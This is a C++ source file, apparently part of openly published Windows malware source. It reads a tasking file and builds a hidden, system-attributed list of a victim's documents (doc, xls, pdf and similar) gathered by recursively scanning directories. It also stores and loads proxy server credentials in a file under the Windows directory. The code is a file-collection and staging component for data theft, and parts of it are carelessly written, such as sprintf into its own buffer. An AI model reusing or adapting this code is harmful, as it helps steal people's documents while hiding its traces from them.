// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "config.hpp"

#include <iostream>
#include "StdAfx.hpp"

BOOL PropagateConfig()
{
	HANDLE hStat_T = CreateFile(g_szStat_T,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (INVALID_HANDLE_VALUE == hStat_T)
		return FALSE;

	CloseHandle(hStat_T);

	HANDLE hDNList = CreateFile(g_szDNList,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
		NULL
	);
	if (INVALID_HANDLE_VALUE == hDNList)
		return FALSE;

	CloseHandle(hDNList);

	int k = 0;

	// ------------------ GET INFO FROM STAT_T ------------------
	Sleep(10);
	int nDirCount = GetPrivateProfileInt("Download", "dircount", 0, g_szStat_T);

	Sleep(10);
	int nFileCount = GetPrivateProfileInt("Download", "filecount", 0, g_szStat_T);

	Sleep(10);
	int nScanDirCount = GetPrivateProfileInt("Scan", "dircount", 0, g_szStat_T);

	// ------------------ COPY DOWNLOAD FILE INDEXES ------------------
	CHAR szDownloadFile[260];
	CHAR szFileIndex1[260];
	CHAR szFileIndex2[260];

	for (int i = 1; i < nFileCount; i++)
	{
		sprintf(szFileIndex1, "f%d", i);
		sprintf(szFileIndex2, "f%d", ++k);

		GetPrivateProfileString("Download", szFileIndex1, g_szBlank, szDownloadFile, 256, g_szStat_T);
		WritePrivateProfileString("Filelist", szFileIndex2, szDownloadFile, g_szDNList);
	}

	// ------------------ COPY DOWNLOAD DIRECTORY INDEXES ------------------
	CHAR szDirIndex[260];
	CHAR szDownloadDir[260];

	for (int l = 1; l <= nDirCount; ++l)
	{
		sprintf(szDirIndex, "d%d", l);
		GetPrivateProfileString("Download", szDirIndex, g_szBlank, szDownloadDir, 256, g_szStat_T);

		GetFolderFirstLevel(szDownloadDir, &k);
		GetFolderRecursive(szDownloadDir, &k);
	}

	// ------------------ WRITE TOTAL FILE COUNT ------------------
	CHAR szFileTotal[260];

	sprintf(szFileTotal, "%d", k);
	WritePrivateProfileString("Filelist", "filetotal", szFileTotal, g_szDNList);

	// ------------------ COPY SCAN DIRECTORY INDEXES ------------------
	int j = 0;

	for (; j < nScanDirCount; j++)
	{
		sprintf(szDirIndex, "d%d", j + 1);

		GetPrivateProfileString("Scan", szDirIndex, g_szBlank, szDownloadDir, 256, g_szStat_T);
		WritePrivateProfileString("ScanList", szDirIndex, szDownloadDir, g_szDNList);
	}

	// ------------------ WRITE TOTAL DIRECTORY COUNT ------------------
	CHAR szScanDirCount[260];

	sprintf(szScanDirCount, "%d", j);
	WritePrivateProfileString("ScanList", "dircount", szScanDirCount, g_szDNList);

	// ------------------ COPY CONFIG TO DNLIST ------------------
	CHAR szBuf512[512];

	GetPrivateProfileString		("Scan",	 "ScanAll", "False", szBuf512, 64, g_szStat_T);
	WritePrivateProfileString	("ScanList", "ScanAll", szBuf512, g_szDNList);

	GetPrivateProfileString		("Other", "TypeLimit", "True", szBuf512, 64, g_szStat_T);
	WritePrivateProfileString	("Other", "TypeLimit", szBuf512, g_szDNList);

	GetPrivateProfileString		("Other", "USearch", "True", szBuf512, 64, g_szStat_T);
	WritePrivateProfileString	("Other", "USearch", szBuf512, g_szDNList);

	GetPrivateProfileString		("Other", "GSearch", "True", szBuf512, 64, g_szStat_T);
	WritePrivateProfileString	("Other", "GSearch", szBuf512, g_szDNList);

	GetPrivateProfileString		("Other", "UTypeLimit", "True", szBuf512, 64, g_szStat_T);
	WritePrivateProfileString	("Other", "UTypeLimit", szBuf512, g_szDNList);

	GetPrivateProfileString		("Other", "UAuto", "False", szBuf512, 64, g_szStat_T);
	WritePrivateProfileString	("Other", "UAuto", szBuf512, g_szDNList);

	GetPrivateProfileString		("Other", "Types", "doc,docx,xls,xlsx,txt,rtf,pdf", szBuf512, 64, g_szStat_T);
	WritePrivateProfileString	("Other", "Types", szBuf512, g_szDNList);

	GetPrivateProfileString		("Other", "UP", "False", szBuf512, 64, g_szStat_T);

	// ------------------ COPY PROXY CONFIG TO CONFIG_T ------------------
	CHAR szWinDir[260];
	CHAR szConfigPath[260];

	GetWindowsDirectory(szWinDir, 260);
	sprintf(szConfigPath, "%s\\system\\config_t.dat", szWinDir);

	if (_stricmp(szBuf512, "True"))
	{
		WritePrivateProfileString("Other", "UP", "0", szConfigPath);
		return TRUE;
	}

	WritePrivateProfileString	("Other", "UP", "1", szConfigPath);

	GetPrivateProfileString		("Other", "PS", g_szBlank, szBuf512, 64, g_szStat_T);
	WritePrivateProfileString	("Other", "PS", szBuf512, szConfigPath);

	GetPrivateProfileString		("Other", "PP", "80", szBuf512, 8, g_szStat_T);
	WritePrivateProfileString	("Other", "PP", szBuf512, szConfigPath);

	GetPrivateProfileString		("Other", "PU", g_szBlank, szBuf512, 32, g_szStat_T);
	WritePrivateProfileString	("Other", "PU", szBuf512, szConfigPath);

	GetPrivateProfileString		("Other", "PW", g_szBlank, szBuf512, 32, g_szStat_T);
	WritePrivateProfileString	("Other", "PW", szBuf512, szConfigPath);

	GetPrivateProfileString		("Other", "PF", "10", szBuf512, 32, g_szStat_T);
	WritePrivateProfileString	("Other", "PF", szBuf512, szConfigPath);

	return TRUE;
}

void LoadProxyConfig()
{
	CHAR szWinDir[260];
	GetWindowsDirectory(szWinDir, 260);

	CHAR szConfigPath[260];
	sprintf(szConfigPath, "%s\\system\\config_t.dat", szWinDir);

	if (FALSE == GetPrivateProfileInt("Other", "UP", 0, szConfigPath))
	{
		g_bUseProxy = FALSE;
		return;
	}

	g_bUseProxy = TRUE;

	CHAR szValue[64];
	GetPrivateProfileString("Other", "PS", g_szBlank, szValue, 64, szConfigPath);
	memset(g_nProxy_IP, 0, 260);
	sprintf(g_nProxy_IP, "%s", szValue);

	GetPrivateProfileString("Other", "PP", "80", g_nProxy_PORT, 8, szConfigPath);
	GetPrivateProfileString("Other", "PU", g_szBlank, szValue, 32, szConfigPath);
	memset(g_nProxy_USER, 0, 32);
	sprintf(g_nProxy_USER, "%s", szValue);

	GetPrivateProfileString("Other", "PW", g_szBlank, szValue, 32, szConfigPath);
	memset(g_nProxy_PSW, 0, 32);
	sprintf(g_nProxy_PSW, "%s", szValue);

	g_nProxy_UNK = GetPrivateProfileInt("Other", "PF", 10, szConfigPath);
}

void GetFolderRecursive(char *szFolder, int *k)
{
	if (szFolder[strlen(szFolder) - 1] != '\\')
		sprintf(szFolder, "%s\\", szFolder);

	CHAR szSearchPattern[260];
	sprintf(szSearchPattern, "%s*.*", szFolder);

	WIN32_FIND_DATA FindFileData;
	HANDLE hFindFile = FindFirstFile(szSearchPattern, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFindFile)
		return;

	char szFullPath[260];
	char szFileName[260];
	do
	{
		if (_stricmp(FindFileData.cFileName, ".") && _stricmp(FindFileData.cFileName, ".."))
		{
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				strcpy(szFileName, FindFileData.cFileName);
				sprintf(szFullPath, "%s%s", szFolder, szFileName);

				GetFolderFirstLevel(szFullPath, k);
				GetFolderRecursive(szFullPath, k);
			}
		}
	}
	while (FindNextFile(hFindFile, &FindFileData));
	FindClose(hFindFile);
}

void GetFolderFirstLevel(char *szFolder, int *k)
{
	if (szFolder[strlen(szFolder) - 1] != '\\')
		sprintf(szFolder, "%s\\", szFolder);

	CHAR szSearchPattern[260];
	sprintf(szSearchPattern, "%s*.*", szFolder);

	WIN32_FIND_DATA FindFileData;
	HANDLE hFindFile = FindFirstFile(szSearchPattern, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFindFile)
		return;

	CHAR szFileName[260];
	CHAR szFileIndex[260];
	CHAR szFullPath[260];
	do
	{
		if (_stricmp(FindFileData.cFileName, ".") && _stricmp(FindFileData.cFileName, ".."))
		{
			if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				++*k;

				strcpy(szFileName, FindFileData.cFileName);
				sprintf(szFullPath, "%s%s", szFolder, szFileName);

				sprintf(szFileIndex, "f%d", *k);
				WritePrivateProfileString("Filelist", szFileIndex, szFullPath, g_szDNList);
			}
		}
	}
	while (FindNextFile(hFindFile, &FindFileData));
	FindClose(hFindFile);
}